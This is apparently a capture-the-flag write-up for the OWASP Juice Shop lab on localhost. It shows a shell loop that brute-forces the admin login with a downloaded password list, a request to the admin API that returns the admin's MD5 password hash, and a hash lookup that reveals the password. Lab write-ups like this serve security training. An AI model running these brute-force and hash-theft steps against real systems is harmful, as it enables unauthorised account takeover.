The hint for this challenge gives us a few options to go after:

```
This one should be equally easy to a) brute force, b) crack the password hash or c) simply guess. Click for more hints.
```

First, I attempted the brute force approach. I downloaded a password list and got to work...

Note that finding the `login` API endpoint was useful ;)

```
http://localhost:3000/rest/user/login
```

Let's grab a password list:

```
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt
```

And start crackin'...

```
$ for password in $(cat 10_million_password_list_top_10000.txt); do echo $password && curl -s -X POST 'email=admin@juice-sh.op&password=$password' 'http://localhost:3000/rest/user/login' && echo; done
123456
Invalid email or password.
password
Invalid email or password.
12345678
Invalid email or password.
qwerty
Invalid email or password.
123456789
Invalid email or password.
...
```

Unfortunately, this didn't turn up much. We could either keep trying password
lists, or look at the password hash. But first, how to we access the password
hash...

I eventually found a way to access the administration API, which offers up a
user's password hash. We can inspect users by visiting the following URL:

```
http://localhost:3000/#/administration
```

Next, we can see it queries for user information by hitting the following
administration API endpoint:

```
http://localhost:3000/api/Users/<user-id>
```

When we hit this API with the admin's user ID we're able to get the hash:

```
$ curl -s 'http://localhost:3000/api/Users/1' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMmU5ZmNmOGUzZGY0ZDQxNWM5NmJjZjI4OGQ1Y2E0YmEiLCJjcmVhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTAxLTAzIDIxOjUwOjE5LjM0NCArMDA6MDAifSwiaWF0IjoxNTE1MDE2OTEzLCJleHAiOjE1MTUwMzQ5MTN9.blyXOlipJkRv73tyR3xBqAE9IDCVImPVVkygMxG_yb_-kDwRNxw4QlR7l8IOLijm2noEOm9y591ds_vy7eTia28QZ8iiTsISPUH-3K_E1qibfntobMvSKeuC-bfFlQ6If7HT9os2ztncJXKw-7cYn4ACB4DkIYUG2ll35DdwXjQ' | python -mjson.tool
{
    "data": {
        "createdAt": "2018-01-03T22:08:12.171Z",
        "email": "admin@juice-sh.op",
        "id": 1,
        "password": "0192023a7bbd73250516f069df18b500",
        "updatedAt": "2018-01-03T22:08:12.171Z"
    },
    "status": "success"
}
```

Finally, a simple Google search for `0192023a7bbd73250516f069df18b500` returns
that this is the MD5 of `admin123`. Logging in with this password completes the
challenge!
